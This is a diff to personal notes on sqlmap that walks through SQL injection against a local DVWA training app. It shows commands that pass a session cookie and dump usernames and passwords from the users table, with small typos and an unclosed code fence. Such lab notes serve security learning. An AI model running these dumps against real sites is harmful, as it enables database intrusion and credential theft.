@@ -1,4 +1,4 @@
-# sqlmap
+x# sqlmap
 
 ## home page:
 http://sqlmap.org/
@@ -37,8 +37,18 @@ first we try with
 
 ```
 python sqlmap.py -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit#"   
---cookie="security=medium;PHPSESSID=ohkmhftad408oltet5pbe57se7" --batch -D dvwa -T users -C user,password --dump
+
 ```
+it doesn't work and the dvwa jump to the homepage, so we need to add the coockie  
+
+```
+python sqlmap.py -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="security=medium;PHPSESSID=ohkmhftad408oltet5pbe57se7" 
+```
+sqlmap shows that the url is injectable and after several tests we use the command below to get the username and password.  
+
+```
+python sqlmap.py -u "http://localhost/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="security=medium;PHPSESSID=ohkmhftad408oltet5pbe57se7"--batch -D dvwa -T users -C user,password --dump
+``
 
 
 
